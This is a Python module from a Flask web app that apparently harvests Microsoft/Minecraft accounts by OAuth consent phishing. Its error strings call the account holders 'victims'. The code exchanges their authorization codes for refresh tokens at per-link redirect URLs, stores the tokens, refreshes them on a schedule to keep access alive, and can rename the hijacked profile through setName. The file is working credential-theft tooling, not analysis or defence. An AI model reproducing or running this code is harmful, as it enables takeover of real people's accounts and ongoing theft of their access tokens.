from app import app, db, models
import urllib
import requests

def get_user_agent():
    return "minecraft account api"

def import_acc(app_id, refresh_token, client_secret = ""):
    acc = Account(app_id=app_id, refresh_token=refresh_token, client_secret=client_secret)

    tokens = refresh_authorization_token(acc.app_id, acc.refresh_token, client_secret = client_secret)

    if "error" in tokens:
        acc.err = f"Microsoft said: {tokens['error_description']}"
        return acc

    return update_acc_by_xbox_accs_token(acc, tokens["access_token"])

def create_acc_by_code(code, link):
    acc = models.Account(app_id=link.app_id, owner=link.owner)

    if not code:
        acc.err = "the victim did not supply a code"
        return acc

    tokens = auth_get_xbox_tokens(link.app_id, code, f"{app.config.get('HOST')}/oauth/{link.id}")

    print(tokens)

    if not tokens:
        acc.err = "the victim supplied an invalid code"
        return acc

    acc.refresh_token = tokens["refresh_token"]

    return update_acc_by_xbox_accs_token(acc, tokens["access_token"])

def refresh_accounts():
    with app.app_context():
        accounts = db.session.query(models.Account) \
                             .filter(models.Account.shadowed == False) \
                             .all()

        uuids = []
        unique_uuid_accs = []
        for account in accounts:
            if account.uuid not in uuids:
                uuids.append(account.uuid)
                if account.name: # saveguard so this: wont refresh None to avoid spamming the minecraft apis. 
                                 # doesnt happen
                    unique_uuid_accs.append(account)

        print(f"refreshing {len(unique_uuid_accs)} accounts.")

        for account in unique_uuid_accs:
            account = update_acc(account)

            accs_2_update = db.session.query(models.Account) \
                                      .filter(models.Account.uuid == account.uuid) \
                                      .filter(models.Account.shadowed == False) \
                                      .all()

            for acc_2_update in accs_2_update:
                acc_2_update.name         = account.name
                acc_2_update.access_token = account.access_token
                acc_2_update.err          = account.err

        db.session.commit()

def update_acc(acc):
    if app.config.get("DEBUG", False):
        print(f"wont refresh {acc.name} to avoid spamming the minecraft apis.")
        return acc

    tokens = refresh_authorization_token(acc.app_id, acc.refresh_token, client_secret = acc.client_secret)

    if "error" in tokens:
        print(f"UNsuccsesfully refreshed account {acc.name} with error {tokens['error_description']}")
        acc.err = f"Microsoft said: {tokens['error_description']}"
        return acc

    print(f"succsesfully refreshed account {acc.name}")

    acc.refresh_token = tokens["refresh_token"]
    return update_acc_by_xbox_accs_token(acc, tokens["access_token"])


def update_acc_by_xbox_accs_token(acc, xbox_access_token):
    xbl_request = auth_authenticate_with_xbl(xbox_access_token)
    xbl_token = xbl_request["Token"]
    userhash = xbl_request["DisplayClaims"]["xui"][0]["uhs"]

    xsts_request = auth_authenticate_with_xsts(xbl_token)

    if "Token" not in xsts_request:
        acc.err = "the victim does not have minecraft"
        print(xsts_request)
        return acc

    xsts_token = xsts_request["Token"]

    account_request = auth_authenticate_with_minecraft(
        userhash, xsts_token)

    if "access_token" not in account_request:
        acc.err = "the account request did not contain an accses token..."
        return acc

    acc.access_token = account_request["access_token"]
    profile = auth_get_profile(account_request["access_token"])

    if "error" in profile:  # better be save with this
        acc.err = "the victim does not have minecraft"
        return acc

    acc.name = profile["name"]
    acc.uuid = profile["id"]

    acc.err = None

    return acc



def auth_get_login_url(client_id: str, redirect_uri: str) -> str:
    """
    Generate a login url.\\
    For a more secure alternative, use get_secure_login_data()

    :return: The url to the website on which the user logs in
    """
    parameters = {
        "client_id": client_id,
        "response_type": "code",
        "redirect_uri": redirect_uri,
        "response_mode": "query",
        "scope": 'Xboxlive.signin Xboxlive.offline_access',
    }

    url = urllib.parse.urlparse("https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize")._replace(
        query=urllib.parse.urlencode(parameters)).geturl()
    return url


def auth_get_profile(access_token: str):
    """
    Get the profile
    """
    header = {
        "Authorization": f"Bearer {access_token}",
        "user-agent": get_user_agent()
    }
    r = requests.get("https://api.minecraftservices.com/minecraft/profile", headers=header)
    return r.json()

def auth_username_by_uuid(uuid):
    """
    Get Username by UUID
    """
    header = {
        "user-agent": get_user_agent()
    }
    r = requests.get(f"https://sessionserver.mojang.com/session/minecraft/profile/{uuid}", headers=header)
    return r.json()

def auth_authenticate_with_minecraft(userhash: str, xsts_token: str):
    """
    Authenticate with Minecraft
    """
    parameters = {
        "identityToken": f"XBL3.0 x={userhash};{xsts_token}"
    }
    header = {
        "user-agent": get_user_agent(),
    }
    r = requests.post("https://api.minecraftservices.com/authentication/login_with_xbox", json=parameters, headers=header)
    return r.json()

def auth_authenticate_with_xsts(xbl_token: str):
    """
    Authenticate with XSTS
    """
    parameters = {
        "Properties": {
            "SandboxId": "RETAIL",
            "UserTokens": [
                xbl_token
            ]
        },
        "RelyingParty": "rp://api.minecraftservices.com/",
        "TokenType": "JWT"
    }
    header = {
        "Content-Type": "application/json",
        "user-agent": get_user_agent(),
        "Accept": "application/json"
    }
    r = requests.post("https://xsts.auth.xboxlive.com/xsts/authorize", json=parameters, headers=header)
    return r.json()

def auth_authenticate_with_xbl(access_token: str):
    """
    Authenticate with Xbox Live
    """
    parameters = {
        "Properties": {
            "AuthMethod": "RPS",
            "SiteName": "user.auth.xboxlive.com",
            "RpsTicket": f"d={access_token}"
        },
        "RelyingParty": "http://auth.xboxlive.com",
        "TokenType": "JWT"
    }
    header = {
        "Content-Type": "application/json",
        "user-agent": get_user_agent(),
        "Accept": "application/json"
    }
    r = requests.post("https://user.auth.xboxlive.com/user/authenticate", json=parameters, headers=header)
    return r.json()

def auth_get_login_url(client_id: str, redirect_uri: str) -> str:
    """
    Generate a login url.\\
    For a more secure alternative, use get_secure_login_data()

    :return: The url to the website on which the user logs in
    """
    parameters = {
        "client_id": client_id,
        "response_type": "code",
        "redirect_uri": redirect_uri,
        "response_mode": "query",
        "scope": 'Xboxlive.signin Xboxlive.offline_access',
    }

    url = urllib.parse.urlparse("https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize")._replace(query=urllib.parse.urlencode(parameters)).geturl()
    return url

def auth_get_xbox_tokens(client_id, code, redirect_uri):
    resp = requests.post("https://login.live.com/oauth20_token.srf", data={
        "grant_type": "authorization_code",
        "client_id": client_id,
        "scope": "Xboxlive.signin Xboxlive.offline_access",
        "code": code,
        "redirect_uri": redirect_uri,
    })

    if resp.status_code != 200:
        return None

    return resp.json()

def refresh_authorization_token(client_id, refresh_token, client_secret = ""):
    """
    Refresh the authorization token
    """
    parameters = {
        "client_id": client_id,
        "scope": "Xboxlive.signin Xboxlive.offline_access",
        "refresh_token": refresh_token,
        "grant_type": "refresh_token"
    }

    if client_secret:
        parameters["client_secret"] = client_secret

    header = {
        "user-agent": get_user_agent()
    }
    r = requests.post("https://login.live.com/oauth20_token.srf", data=parameters, headers=header)
    return r.json()

def setName(token, newName):
    return requests.put(f'https://api.minecraftservices.com/minecraft/profile/name/{newName}', headers={'Authorization': f'Bearer {token}','Content-Type':'application/json; charset=utf-8'})